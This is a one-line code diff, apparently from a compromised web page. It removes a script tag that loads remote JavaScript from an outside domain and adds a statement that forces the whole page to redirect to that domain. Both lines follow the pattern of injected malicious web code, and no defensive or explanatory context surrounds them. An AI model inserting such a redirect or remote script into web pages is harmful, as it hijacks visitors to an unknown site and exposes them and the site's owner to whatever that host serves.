@@ -1,1 +1,1 @@
-<script type="text/javascript" src="http://futunga.com/a.js"></script>
+top.location.href="http://futunga.com";
